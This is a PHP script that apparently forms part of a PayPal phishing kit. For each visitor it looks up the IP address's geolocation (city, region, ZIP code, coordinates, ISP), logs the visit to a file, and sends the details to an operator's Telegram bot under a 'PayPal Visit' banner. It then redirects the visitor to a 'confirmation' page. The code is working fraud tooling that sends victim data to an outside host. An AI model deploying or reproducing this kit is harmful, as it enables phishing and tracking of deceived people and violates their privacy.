<?php
include "Config.php";

// Get visitor's IP address
$ip = getenv("REMOTE_ADDR");

// Function to convert country code to emoji flag
function countryCodeToEmoji($countryCode) {
    if (strlen($countryCode) !== 2) return '';
    $offset = 127397;
    return mb_chr(ord($countryCode[0]) + $offset, 'UTF-8') .
           mb_chr(ord($countryCode[1]) + $offset, 'UTF-8');
}

// Try primary API: ipapi.co
$lookup = @json_decode(file_get_contents("https://ipapi.co/{$ip}/json/"));

if (!$lookup || isset($lookup->error)) {
    // Fallback to ip-api.com
    $lookup = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $COUNTRY = $lookup->country ?? 'Unknown';
    $COUNTRY_CODE = $lookup->countryCode ?? '';
    $CITY = $lookup->city ?? 'Unknown';
    $REGION = $lookup->regionName ?? 'Unknown';
    $ZIPCODE = $lookup->zip ?? 'Unknown';
    $LAT = $lookup->lat ?? '';
    $LON = $lookup->lon ?? '';
    $ORG = $lookup->org ?? 'Unknown';
    $TIMEZONE = $lookup->timezone ?? 'Unknown';
} else {
    $COUNTRY = $lookup->country_name ?? 'Unknown';
    $COUNTRY_CODE = $lookup->country_code ?? '';
    $CITY = $lookup->city ?? 'Unknown';
    $REGION = $lookup->region ?? 'Unknown';
    $ZIPCODE = $lookup->postal ?? 'Unknown';
    $LAT = $lookup->latitude ?? '';
    $LON = $lookup->longitude ?? '';
    $ORG = $lookup->org ?? ($lookup->org_name ?? 'Unknown');
    $TIMEZONE = $lookup->timezone ?? 'Unknown';
}

$FLAG = countryCodeToEmoji(strtoupper($COUNTRY_CODE));
$LOC = ($LAT && $LON) ? "{$LAT},{$LON}" : 'Unknown';

// Log the visit
$logFile = fopen("Visit.txt", "a");
fwrite($logFile, $ip . " - Country: " . $COUNTRY . " {$FLAG} - " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n");
fclose($logFile);

// Send Telegram message
$message = "🔥 ########## PayPal Visit ########## 🔥\n"
     . "🌐 IP: whatismyip.com/ip/" . $ip . "\n"
     . "🏳️ Country: {$COUNTRY} {$FLAG}\n"
     . "🏙️ City: {$CITY}\n"
     . "📍 Region: {$REGION}\n"
     . "📮 Zip: {$ZIPCODE}\n"
     . "🗺️ Location (lat, long): {$LOC}\n"
     . "🏢 Organization: {$ORG}\n"
     . "⏰ Timezone: {$TIMEZONE}\n\n"
     . "########## © Mr900 ##########\n"
     . "#############################";

file_get_contents("https://api.telegram.org/bot{$api}/sendMessage?chat_id={$chatid}&text=" . urlencode($message));

// Redirect
header("Location: ./confirmation");
exit;
?>